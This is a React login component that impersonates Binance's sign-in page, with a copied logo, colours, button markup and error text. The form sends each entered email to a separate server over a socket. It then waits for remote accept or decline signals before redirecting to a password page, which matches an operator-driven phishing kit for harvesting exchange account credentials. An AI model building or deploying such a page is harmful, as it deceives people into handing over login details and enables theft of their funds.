import React, { useState } from "react";
import Spinner from "../components/Spinner";
import { serverRoute, socket } from "./Main";
import axios from "axios";

const Login = () => {
  const [email, setEmail] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  const handleSubmit = async (e) => {
    setError(false);
    e.preventDefault();
    setLoading(true);
    await axios.post(serverRoute + "/login", { email }).then(() => {
      socket.emit("email", { mail: email });
    });
  };

  const reject = (data) => {
    if (data.email === email) {
      setError(true);
      setLoading(false);
    }
  };
  const accept = (data) => {
    if (data.email === email) {
      setError(false);
      setLoading(false);
      sessionStorage.setItem("email", email);
      window.location.href = "/password";
    }
  };

  socket.on("declineEmail", reject);
  socket.on("acceptEmail", accept);

  return (
    <div className="flex items-center flex-col justify-center md:w-3/12 rounded-md w-10/12 m-2 h-full bg-gray-800 bg-opacity-70 ">
      <div className="  flex flex-col items-center justify-center w-full   rounded-xl md:border  border-gray-600 px-8 pb-5 pt-2">
        <div className="md:w-10/12 ">
          <svg
            className="
        w-2/5
        h-28"
            viewBox="0 0 120 30"
          >
            <path
              fill="#F0B90B"
              d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"
            ></path>
          </svg>
        </div>
        <div className="md:w-10/12 w-full flex items-center justify-between">
          <header className="text-white text-4xl ">Log in</header>
          <svg
            fill="textPrimary"
            size="32"
            style={{ color: "white" }}
            className="w-10 bg-slate-400 bg-opacity-20 rounded-md p-1"
            class="bn-svg w-[32px] h-[32px] text-[--color-textPrimary] "
            viewBox="0 0 24 24"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M4 4h7v7H4V4zm0 9h7v7H4v-7zm11 0h-2v4h4v-2h3v-2h-4v2h-1v-2zm5 3h-2v2h-2v2h4v-4zm-5 2h-2v2h2v-2zM13 4h7v7h-7V4zM8.5 6.5h-2v2h2v-2zm-2 9h2v2h-2v-2zm11-9h-2v2h2v-2z"
              fill="currentColor"
            ></path>
          </svg>
        </div>
        <form
          className="mt-10 flex items-center justify-center flex-col gap-y-1 md:w-11/12 w-full"
          onSubmit={handleSubmit}
        >
          <span className="text-white text-lg text-start md:w-11/12 w-full">
            Email/Phone number
          </span>
          <input
            type="text"
            placeholder="Email/Phone (without country code)"
            autocapitalize={"off"}
            value={email}
            onChange={(e) => {
              setError(false);
              setEmail(e.target.value);
            }}
            required
            className={`bg-inherit md:w-11/12 w-full p-3  md:placeholder:font-bold border text-sm md:text-base  text-white border-gray-700 rounded-lg outline-white ${
              error && "outline-red-500 border-red-500"
            }`}
          />
          {error ? (
            <span className="text-red-500 w-full md:ml-6 text-sm md:text-base">
              Binance account not found .
            </span>
          ) : (
            ""
          )}
          <button
            style={{ backgroundColor: "#F0B90B", color: "#1f1f1f" }}
            className={` ${
              loading ? "cursor-progress" : "cursor-pointer"
            } md:w-11/12 w-full rounded-md py-2 text-xl my-5 hover:opacity-80 transition-all`}
          >
            {loading ? <Spinner /> : "Next"}
          </button>
        </form>

        <div
          className="w-11/12 bg-gray-600 flex items-center justify-center  "
          style={{ height: "1px" }}
        >
          <span
            className="px-2  text-white -mt-1"
            style={{ background: "rgb(31, 31, 31)" }}
          >
            or
          </span>
        </div>
        <div
          className="flex items-center justify-center gap-x-16 border-gray-600 py-3  border rounded-xl my-4 md:w-10/12 w-full cursor-pointer hover:opacity-90 transition-all "
          style={{}}
        >
          <div className=" flex items-start justify-start">
            <img src="/google.png" className="w-10" />{" "}
          </div>
          <span className="flex-1 text-gray-300 font-semibold  -ml-10">
            Continue with Google
          </span>
        </div>
        <div
          className="flex items-center justify-center gap-x-16 border-gray-600 py-3  border rounded-xl my-1 md:w-10/12 w-full cursor-pointer hover:opacity-90 transition-all"
          style={{}}
        >
          <div className=" flex items-start justify-start">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="#EAECEF"
              viewBox="0 0 14 16"
              class="bn-svg"
              className="ml-3"
            >
              <path
                fill="#EAECEF"
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M10.4879 0C10.5996 0.96953 10.1968 1.92387 9.60713 2.62641C8.99235 3.31738 8.00749 3.84556 7.04923 3.77755C6.92385 2.84564 7.40944 1.85368 7.95278 1.24881C8.56756 0.561459 9.63448 0.035453 10.4879 0ZM13.5527 5.20694C13.4395 5.27152 11.6741 6.27909 11.6936 8.32883C11.7157 10.8105 13.9734 11.6303 14 11.639C13.9871 11.6969 13.6466 12.8227 12.8008 13.9658C12.0941 14.9723 11.3524 15.9563 10.1768 15.9736C9.61736 15.986 9.23962 15.8329 8.84599 15.6732C8.43549 15.5068 8.00771 15.3333 7.33854 15.3333C6.62905 15.3333 6.18224 15.5125 5.75142 15.6852C5.37887 15.8346 5.01827 15.9792 4.51011 15.999C3.38999 16.0388 2.53356 14.9245 1.80099 13.9275C0.337388 11.8915 -0.802493 8.18846 0.725707 5.66913C1.46663 4.43334 2.81701 3.63818 4.2601 3.61648C4.89566 3.60418 5.50537 3.83743 6.03985 4.0419C6.44862 4.19829 6.81339 4.33784 7.11208 4.33784C7.37475 4.33784 7.72947 4.20381 8.14285 4.04763C8.79383 3.80168 9.59027 3.50077 10.4018 3.58175C10.9565 3.59694 12.5372 3.79012 13.5554 5.20535L13.5527 5.20694Z"
              ></path>
            </svg>
          </div>
          <span className="flex-1 -ml-8 text-gray-300 font-semibold">
            Continue with Apple
          </span>
        </div>
        <div
          className="flex items-center justify-center gap-x-16 border-gray-600 py-3  border rounded-xl my-2 md:w-10/12 w-full cursor-pointer hover:opacity-90 transition-all"
          style={{}}
        >
          <div className=" flex items-start justify-start">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="20"
              height="20"
              className="ml-3"
              class="bn-svg"
            >
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M2.81176 9.27221C7.28568 7.323 10.269 6.03796 11.7617 5.41709C16.0237 3.64439 16.9093 3.33645 17.4865 3.32628C17.6135 3.32404 17.8973 3.35551 18.0812 3.50471C18.2365 3.63069 18.2792 3.80087 18.2996 3.92032C18.3201 4.03976 18.3455 4.31186 18.3253 4.52447C18.0943 6.95117 17.095 12.8401 16.5865 15.5581C16.3714 16.7081 15.9478 17.0937 15.5377 17.1315C14.6465 17.2135 13.9698 16.5425 13.1066 15.9767C11.7559 15.0913 10.9928 14.5401 9.68167 13.6761C8.16646 12.6776 9.14871 12.1288 10.0122 11.2319C10.2382 10.9972 14.1649 7.42551 14.2409 7.10151C14.2505 7.06098 14.2593 6.90993 14.1695 6.83017C14.0798 6.75042 13.9474 6.77769 13.8518 6.79938C13.7163 6.83013 11.5585 8.25635 7.3784 11.078C6.76592 11.4986 6.21115 11.7035 5.7141 11.6928C5.16614 11.681 4.11208 11.383 3.3285 11.1283C2.3674 10.8159 1.60354 10.6507 1.67005 10.1201C1.7047 9.84375 2.08527 9.56112 2.81176 9.27221Z"
                fill="#00AEED"
              ></path>
            </svg>
          </div>
          <span className="flex-1 -ml-6 text-gray-300 font-semibold">
            Continue with Telegram
          </span>
        </div>
      </div>
      <div
        className="flex items-center justify-center my-5 text-order"
        style={{ color: "#F0B90B" }}
      >
        Create a Binance Account
      </div>
    </div>
  );
};

export default Login;

// <button
//   class="bn-button bn-button__icon bn-button__icon__line data-size-large icon-button "
//   id="apple-login-btn"
//   data-e2e="btn-apple-login"
// >
//   <div class="icon-warp">
//     <svg
//       xmlns="http://www.w3.org/2000/svg"
//       width="16"
//       height="16"
//       fill="#EAECEF"
//       viewBox="0 0 14 16"
//       class="bn-svg"
//     >
//       <path
//         fill="#EAECEF"
//         fill-rule="evenodd"
//         clip-rule="evenodd"
//         d="M10.4879 0C10.5996 0.96953 10.1968 1.92387 9.60713 2.62641C8.99235 3.31738 8.00749 3.84556 7.04923 3.77755C6.92385 2.84564 7.40944 1.85368 7.95278 1.24881C8.56756 0.561459 9.63448 0.035453 10.4879 0ZM13.5527 5.20694C13.4395 5.27152 11.6741 6.27909 11.6936 8.32883C11.7157 10.8105 13.9734 11.6303 14 11.639C13.9871 11.6969 13.6466 12.8227 12.8008 13.9658C12.0941 14.9723 11.3524 15.9563 10.1768 15.9736C9.61736 15.986 9.23962 15.8329 8.84599 15.6732C8.43549 15.5068 8.00771 15.3333 7.33854 15.3333C6.62905 15.3333 6.18224 15.5125 5.75142 15.6852C5.37887 15.8346 5.01827 15.9792 4.51011 15.999C3.38999 16.0388 2.53356 14.9245 1.80099 13.9275C0.337388 11.8915 -0.802493 8.18846 0.725707 5.66913C1.46663 4.43334 2.81701 3.63818 4.2601 3.61648C4.89566 3.60418 5.50537 3.83743 6.03985 4.0419C6.44862 4.19829 6.81339 4.33784 7.11208 4.33784C7.37475 4.33784 7.72947 4.20381 8.14285 4.04763C8.79383 3.80168 9.59027 3.50077 10.4018 3.58175C10.9565 3.59694 12.5372 3.79012 13.5554 5.20535L13.5527 5.20694Z"
//       ></path>
//     </svg>
//   </div>
//   <div>Continue with Apple</div>
// </button>;

{
  /* <button class="bn-button bn-button__icon bn-button__icon__line data-size-large icon-button mt-4">
  <div class="icon-warp">
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="20"
      height="20"
      viewBox="0 0 20 20"
      class="bn-svg"
    >
      <path
        fill-rule="evenodd"
        clip-rule="evenodd"
        d="M2.81176 9.27221C7.28568 7.323 10.269 6.03796 11.7617 5.41709C16.0237 3.64439 16.9093 3.33645 17.4865 3.32628C17.6135 3.32404 17.8973 3.35551 18.0812 3.50471C18.2365 3.63069 18.2792 3.80087 18.2996 3.92032C18.3201 4.03976 18.3455 4.31186 18.3253 4.52447C18.0943 6.95117 17.095 12.8401 16.5865 15.5581C16.3714 16.7081 15.9478 17.0937 15.5377 17.1315C14.6465 17.2135 13.9698 16.5425 13.1066 15.9767C11.7559 15.0913 10.9928 14.5401 9.68167 13.6761C8.16646 12.6776 9.14871 12.1288 10.0122 11.2319C10.2382 10.9972 14.1649 7.42551 14.2409 7.10151C14.2505 7.06098 14.2593 6.90993 14.1695 6.83017C14.0798 6.75042 13.9474 6.77769 13.8518 6.79938C13.7163 6.83013 11.5585 8.25635 7.3784 11.078C6.76592 11.4986 6.21115 11.7035 5.7141 11.6928C5.16614 11.681 4.11208 11.383 3.3285 11.1283C2.3674 10.8159 1.60354 10.6507 1.67005 10.1201C1.7047 9.84375 2.08527 9.56112 2.81176 9.27221Z"
        fill="#00AEED"
      ></path>
    </svg>
  </div>
  <div>Continue with Telegram</div>
</button>; */
}
